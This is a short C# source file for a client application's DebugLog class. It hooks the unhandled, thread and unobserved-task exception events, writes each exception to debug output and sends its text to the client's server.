﻿using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Pulsar.Client.Networking;
using Pulsar.Common.Messages;

namespace Pulsar.Client.User
{
    internal class DebugLog : IDisposable
    {
        private readonly PulsarClient _client;

        public DebugLog(PulsarClient client)
        {
            _client = client ?? throw new ArgumentNullException(nameof(client));
            AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
            Application.ThreadException += Application_ThreadException;
            TaskScheduler.UnobservedTaskException += TaskScheduler_UnobservedTaskException;
        }
        private void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.ExceptionObject is Exception ex)
            {
                LogException(ex);
                _client.Send(new GetDebugLog { Log = ex.ToString() });
            }
        }
        private void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
        {
            LogException(e.Exception);
            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
        }
        private void TaskScheduler_UnobservedTaskException(object sender, UnobservedTaskExceptionEventArgs e)
        {
            LogException(e.Exception);
            _client.Send(new GetDebugLog { Log = e.Exception.ToString() });
        }
        private void LogException(Exception ex)
        {
            Debug.WriteLine($"Exception: {ex.Message}\nStack Trace: {ex.StackTrace}");
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {

            }
        }
    }
}
